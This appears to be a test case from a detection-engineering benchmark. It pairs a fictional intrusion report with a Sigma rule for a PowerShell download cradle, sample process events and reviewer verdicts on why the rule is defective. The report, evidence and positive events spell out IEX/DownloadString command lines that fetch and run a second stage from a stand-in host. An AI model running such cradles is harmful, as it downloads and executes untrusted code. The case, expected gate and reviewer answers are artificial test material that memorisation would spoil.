id: D5-01
role: defective
defect_class: D5
evasive: false
why: 'The rule''s only discriminating field is ScriptBlockText on a PowerShell script block log source
  (event 4104), and the laboratory catalog marks windows_powershell_script_block as available: false,
  so the rule cannot fire on any telemetry the laboratory collects. Everything else (metadata, tags, evidence-backed
  values) is valid.'
expected_gate: G6
report_text: 'During the intrusion at a regional freight broker, the operator launched PowerShell with
  an encoded command, so the process command line showed only an opaque Base64 string. The analyst team
  enabled PowerShell script block logging on the affected servers and recovered the decoded body from
  event 4104. The decoded script block was a classic download cradle: it built a Net.WebClient object,
  called DownloadString against a staging server and piped the result straight into Invoke-Expression.
  The recovered text read: IEX (New-Object Net.WebClient).DownloadString(''http://cdn-assets.glasswharf.example/stage2.ps1'').
  The staging host cdn-assets.glasswharf.example served only a second-stage loader and was registered
  two days before the intrusion. We assess the cradle as the first hands-on-keyboard action after initial
  access, and the only place it is visible in cleartext is the script block log, because the command line
  itself was encoded.'
evidence:
- IEX (New-Object Net.WebClient).DownloadString('http://cdn-assets.glasswharf.example/stage2.ps1')
- 'The decoded script block was a classic download cradle: it built a Net.WebClient object, called DownloadString
  against a staging server and piped the result straight into Invoke-Expression.'
logsource: windows_powershell_script_block
techniques:
- T1059.001
- T1105
sigma_yaml: |
  title: PowerShell Script Block Download Cradle From Staging Host
  id: 3f6a1c52-8e47-4b0d-9a21-5c7d0e1f4a01
  status: experimental
  description: Detects a decoded PowerShell script block that fetches a second stage with Net.WebClient DownloadString from the staging host named in the report.
  references:
    - urn:atidep:case
  author: case-author
  date: 2026/10/02
  tags:
    - attack.execution
    - attack.t1059.001
    - attack.command_and_control
    - attack.t1105
  logsource:
    category: ps_script
    product: windows
  detection:
    selection:
      ScriptBlockText|contains|all:
        - Net.WebClient
        - DownloadString
        - cdn-assets.glasswharf.example
    condition: selection
  falsepositives:
    - Administrator scripts that download modules from the same host during an approved change
  level: high
assumptions: []
events:
  positive:
  - kind: process_create
    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
    cmd: powershell.exe -NoProfile -Command "IEX (New-Object Net.WebClient).DownloadString('http://cdn-assets.glasswharf.example/stage2.ps1')"
    parent: C:\Windows\System32\cmd.exe
    parent_cmd: cmd.exe /c start powershell
    user: LAB\svc-freight
    dest_ip: null
    dest_port: null
    name: null
  - kind: process_create
    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
    cmd: powershell.exe -ExecutionPolicy Bypass -Command "$w = New-Object Net.WebClient; IEX $w.DownloadString('http://cdn-assets.glasswharf.example/stage2.ps1')"
    parent: C:\Windows\System32\wbem\WmiPrvSE.exe
    parent_cmd: C:\Windows\System32\wbem\WmiPrvSE.exe -secured -Embedding
    user: LAB\svc-freight
    dest_ip: null
    dest_port: null
    name: null
  negative:
  - kind: process_create
    image: C:\Windows\System32\notepad.exe
    cmd: notepad.exe C:\Users\alice\notes.txt
    parent: C:\Windows\explorer.exe
    parent_cmd: explorer.exe
    user: LAB\alice
    dest_ip: null
    dest_port: null
    name: null
  - kind: process_create
    image: C:\Windows\System32\ipconfig.exe
    cmd: ipconfig /all
    parent: C:\Windows\System32\cmd.exe
    parent_cmd: cmd.exe
    user: LAB\bob
    dest_ip: null
    dest_port: null
    name: null
  lookalike:
  - kind: process_create
    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
    cmd: powershell.exe -NoProfile -Command "(New-Object Net.WebClient).DownloadString('https://repo.corp.example/modules/index.txt')"
    parent: C:\Windows\System32\cmd.exe
    parent_cmd: cmd.exe
    user: LAB\admin-carol
    dest_ip: null
    dest_port: null
    name: null
tamper_sigma_yaml: ''
review:
  verdicts:
  - reviewer: R1
    role: primary
    verdict: present
    confidence: 95
    reasoning: The only discriminating field is ScriptBlockText|contains|all (Net.WebClient, DownloadString,
      cdn-assets.glasswharf.example), which the contract lists solely under the unavailable windows_powershell_script_block
      source. The Sigma logsource is category ps_script, which is not one of the three allowed categories,
      and the case-level logsource is windows_powershell_script_block. pySigma parses the rule, so the
      only blocker is the telemetry, which is what G6 should catch. Both evidence quotations occur verbatim
      in report_text, and the tags match the ATT&CK table, so no other defect masks this one.
    events_ok: true
    incidental_issues:
    - Events are process_create although the rule's log source is ps_script. The event format has no script-block
      kind, so this is unavoidable, and a ScriptBlockText rule cannot match any of them.
    - The positive events put the cradle in cleartext on CommandLine. The report says the command line
      was encoded and the text is visible only in the script block log, so the events contradict the report's
      premise. They are still behaviourally correct positives.
    - The lookalike (Net.WebClient DownloadString from repo.corp.example) is a reasonable benign look-alike
      and does not contain the staging host.
  - reviewer: R2
    role: primary
    verdict: present
    confidence: 97
    reasoning: The only detection field is ScriptBlockText (contains|all Net.WebClient, DownloadString,
      cdn-assets.glasswharf.example), and logsource is category ps_script. The contract lists ScriptBlockText
      as belonging to windows_powershell_script_block, which is marked available:false, and ps_script
      is not one of the three allowed categories. The rule has no process_creation, network or DNS fallback,
      so G6 should block it. The YAML parses, and both evidence quotes are verbatim in the report.
    events_ok: true
    incidental_issues:
    - All events are process_create with the behaviour in the cmd string, but the rule's log source (ps_script)
      has no matching event kind, so the event-kind rule in the contract cannot be met.
    - The report says the real command line was Base64-encoded, but the positive events show the cradle
      in clear text on the command line. This makes the 'only visible in script block' premise inconsistent
      with the events.
    - The tags are correct (attack.execution, attack.t1059.001, attack.command_and_control, attack.t1105).
excluded: false
exclusion_reason: ''
